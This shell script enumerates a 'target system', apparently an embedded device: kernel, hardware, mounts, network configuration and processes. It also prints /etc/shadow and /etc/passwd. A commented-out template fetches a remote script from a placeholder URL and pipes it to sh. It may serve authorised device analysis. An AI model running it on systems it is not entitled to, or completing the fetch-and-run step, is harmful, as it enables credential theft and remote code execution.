#!/bin/sh
#
# Purpose: Identify target system

set -x

id
w

cat /proc/version # || die "ERROR: /proc filesystem not mounted"
cat /proc/cmdline

cat /proc/cpuinfo
cat /proc/meminfo
cat /proc/uptime

cat /proc/mounts
cat /proc/mtd

lsmod

fdisk -l
mount
df -h

ls -la /etc/passwd && cat /etc/passwd
ls -la /etc/shadow && cat /etc/shadow
ls -la /etc/group  && cat /etc/group

lsusb

ifconfig
ip address
ip route
iwconfig

which curl
which wget

# REMOTEURL="https://www.example.com/TODO.sh"
# FETCHER=wget -O-
# FETCHER=curl
# [ "${SCRIPT}" != "" ] ${FETCHER} ${REMOTEURL} | sh

systemctl --version
ps axfw
netstat -nta

# EOF